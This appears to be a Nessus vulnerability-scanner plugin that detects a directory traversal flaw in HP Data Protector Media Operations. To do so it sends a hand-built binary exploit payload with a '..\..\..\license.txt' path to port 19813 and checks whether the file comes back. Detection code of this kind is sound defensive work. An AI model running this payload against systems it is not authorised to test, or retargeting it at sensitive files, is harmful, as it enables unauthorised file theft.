#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58387);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_bugtraq_id(50531);
  script_osvdb_id(76841);

  script_name(english:"HP Data Protector Media Operations DBServer opcode 0x10 Traversal Arbitrary File Access");
  script_summary(english:"Tries to read application's license.txt");

  script_set_attribute(attribute:"synopsis", value:
"The remote service is affected by a remote directory traversal
vulnerability.");
  script_set_attribute(attribute:"description", value:
"HP Data Protector Media Operations is affected by a directory
traversal vulnerability because it fails to sufficiently sanitize
user-supplied input.  Successfully exploiting the issue may allow an
attacker to obtain read arbitrary files that could aid in further
attacks.");
  script_set_attribute(attribute:"solution", value:
"Limit access to this service as there is no known fix currently.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/hpdpmedia_1-adv.txt");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/11/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/03/19");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:storage_data_protector_media_operations");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl");
  script_require_ports(19813, 'Services/hpdp_media');

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:'hpdp_media', default:19813, exit_on_fail:TRUE);

s = open_sock_tcp(port);
if (!s) exit(0, "Failed to open a socket on port " + port + ".");

# Exploit code based on http://aluigi.org/poc/hpdpmedia_1.dat 
# with some minor changes
send(socket:s, data:
'\x01\x00\x00\x01\x00\x00\x00\x00\x01\x02\x03\x04\x03\x00\x00\x01' + 
'\x00\x00\x00\x06\x01\x02\x03\x04\x2c\x00\x82\x00\x00\x00\x03\x00' + 
'\x00\x01\x00\x00\x00\x82\x01\x02\x03\x04\x80\x55\x53\x45\x52\x4e' + 
'\x41\x4d\x45\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x01' + 
'\x00\x00\x00\x06\x01\x02\x03\x04\x8f\x00\x04\x00\x00\x00\x03\x00' + 
'\x00\x01\x00\x00\x00\x04\x01\x02\x03\x04\x10\x00\x00\x00\x03\x00' + 
'\x00\x01\x00\x00\x00\x06\x01\x02\x03\x04\x90\x00\x44\x00\x00\x00' + 
'\x03\x00\x00\x01\x00\x00\x00\x44\x01\x02\x03\x04\x10\x00\x00\x00' + 
'\x40' +
"..\..\..\license.txt" + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' +
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
'\x00\x00');

data = recv(socket:s, length:4096);

# Check if we got a copy of their license agreement (means it's definitely
# vulnerable)
if('HEWLETT PACKARD COMPANY LICENSE AGREEMENT' >< data)
{
  if(report_verbosity > 1)
  {
    report = "
The HP Data Protector Media Operations license.txt file - located by
default at 'C:\Program Files\Hewlett-Packard\DataMgt\MediaOps' - was
successfully downloaded:

" + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + "
" + substr(data, 0x4fc, 0x8fc) + "
" + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + "
";

    security_warning(port:port, extra:report);
  }
  else
    security_warning(port);
}
else
  exit(0, "The HP Data Protector Media Operations daemon listening on port "+port+" is not affected.");
